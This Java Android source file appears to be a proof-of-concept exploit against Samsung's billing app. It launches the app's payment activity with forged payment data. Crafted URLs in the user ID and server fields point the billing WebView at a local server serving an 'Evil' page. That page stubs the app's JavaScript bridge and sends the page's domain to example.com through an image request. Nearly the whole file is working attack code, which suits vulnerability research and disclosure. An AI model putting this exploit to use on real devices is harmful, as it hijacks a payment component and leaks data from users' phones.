package poc.app;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

import com.google.gson.Gson;
import com.sec.android.app.billing.unifiedpayment.info.DeviceInfo;
import com.sec.android.app.billing.unifiedpayment.info.PaymentInfo;
import com.sec.android.app.billing.unifiedpayment.info.ProductDetailInfo;
import com.sec.android.app.billing.unifiedpayment.info.ProductInfo;
import com.sec.android.app.billing.unifiedpayment.info.ServiceStoreInfo;
import com.sec.android.app.billing.unifiedpayment.info.SignatureInfo;
import com.sec.android.app.billing.unifiedpayment.info.UnifiedPaymentInfo;
import com.sec.android.app.billing.unifiedpayment.info.UnifiedPaymentServerInfo;
import com.sec.android.app.billing.unifiedpayment.info.UserInfo;

import java.io.PrintWriter;
import java.util.Map;

public class MainActivity extends Activity {
    private WebServer webServer = new WebServer() {
        @Override
        protected void printHeaders(PrintWriter printWriter, String path, Map<String, String> queryParams) {
            printHeader(printWriter, "Content-Type", "text/html");
        }

        @Override
        protected void printBody(PrintWriter printWriter, String path, Map<String, String> queryParams) {
            printWriter.println("<h1>Evil</h1>");
            printWriter.println("<script>" +
                    "window.android={};" +
                    "window.android.purchaseConfirmPasswordResult=function(x){};" +
                    "window.android.handleCachedResult=function(x){};" +
                    "window.android.jsAndroidEvent=function(x,y){};" +
                    "</script>");
            printWriter.println("<script>" +
                    "new Image().src='http://example.com?domain=' + document.domain;" +
                    "</script>");
        }
    };

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main_activity);

        webServer.start(8888);

        findViewById(R.id.button).setOnClickListener((view) -> {
            launchWithData("1", "http://127.0.0.1:8888/#https://google.com/");
        });
        findViewById(R.id.button2).setOnClickListener((view) -> {
            launchWithData("1http://127.0.0.1:8888/#","https://google.com/");
        });
    }

    private void launchWithData(String userId, String url) {
        final String dummyString = "1";

        DeviceInfo deviceInfo = new DeviceInfo();
        deviceInfo.setDeviceUID(dummyString);

        PaymentInfo paymentInfo = new PaymentInfo();
        paymentInfo.setPaymentType(dummyString);

        ProductDetailInfo productDetailInfo = new ProductDetailInfo();
        productDetailInfo.setAmount(dummyString);
        productDetailInfo.setProductID(dummyString);
        productDetailInfo.setProductName(dummyString);

        ServiceStoreInfo serviceStoreInfo = new ServiceStoreInfo();
        serviceStoreInfo.setCountry(dummyString);

        ProductInfo productInfo = new ProductInfo();
        productInfo.setCurrency(dummyString);
        productInfo.setTotalAmount(dummyString);
        productInfo.setDetailProductInfos(new ProductDetailInfo[]{productDetailInfo});

        SignatureInfo signatureInfo = new SignatureInfo();
        signatureInfo.setBaseString(dummyString);
        signatureInfo.setSignature(dummyString);
        signatureInfo.setTimeStamp(dummyString);

        UserInfo userInfo = new UserInfo();
        userInfo.setAccessToken("GuestCheckout");
        userInfo.setUserEmail(dummyString);
        userInfo.setUserID(userId);

        UnifiedPaymentServerInfo serverInfo = new UnifiedPaymentServerInfo();
        serverInfo.setUpServerURL(url);

        UnifiedPaymentInfo info = new UnifiedPaymentInfo();
        info.setAppServiceID(dummyString);
        info.setStoreRequestID(dummyString);
        info.setDeviceInfo(deviceInfo);
        info.setPaymentInfo(paymentInfo);
        info.setProductInfo(productInfo);
        info.setServiceStoreInfo(serviceStoreInfo);
        info.setSignatureInfo(signatureInfo);
        info.setUserInfo(userInfo);
        info.setBillingServerInfo(serverInfo);

        Intent i = new Intent();
        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        i.setClassName("com.sec.android.app.billing", "com.sec.android.app.billing.unifiedpayment.activity.PaymentActivity");
        i.putExtra("NEW_SDK", true);
        i.putExtra("PACKAGE_NAME", getPackageName());
        i.putExtra("BILLING_DATA", new Gson().toJson(info));
        startActivity(i);
    }
}